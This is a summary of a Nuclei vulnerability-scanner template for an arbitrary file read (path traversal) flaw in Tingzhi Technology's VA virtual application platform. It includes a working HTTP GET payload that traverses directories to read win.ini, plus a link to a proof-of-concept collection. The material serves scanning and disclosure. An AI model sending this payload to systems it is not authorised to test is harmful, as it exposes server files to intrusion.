# Nuclei Template: EAA Application Access System - Arbitary File Read
**Template ID:** eaa-app-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`eaa-app-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the VA virtual application platform of Tingzhi Technology, through which an attacker can obtain sensitive information in the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%20VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
